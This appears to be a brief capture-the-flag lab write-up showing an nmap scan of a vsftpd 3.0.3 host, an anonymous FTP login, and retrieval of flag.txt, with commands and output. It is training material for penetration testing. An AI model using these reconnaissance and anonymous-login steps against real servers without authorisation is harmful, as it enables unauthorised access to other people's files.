# Ftp (unix)

## Scan

```bash
nmap -sV 10.129.52.11

# PORT   STATE SERVICE VERSION
# 21/tcp open  ftp     vsftpd 3.0.3
# Service Info: OS: Unix
```

21/tcp is open, try to exploit ftp.

## Exploit

```bash
ftp 10.129.52.11

# Connected to 10.129.52.11.
# 220 (vsFTPd 3.0.3)
# Name (10.129.52.11:wcyat):
```

Try common misconfiguration of ftp servers (the anonymous user).

```bash
Name (10.129.52.11:wcyat): anonymous
Password: anonymous

230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> 
```

Successfully logged in. We can get the files.

```bash
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rw-r--r--    1 0        0              32 Jun 04  2021 flag.txt
226 Directory send OK.
ftp> get flag.txt
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for flag.txt (32 bytes).
226 Transfer complete.
32 bytes received in 0.000138 seconds (226 kbytes/s)
ftp>
```
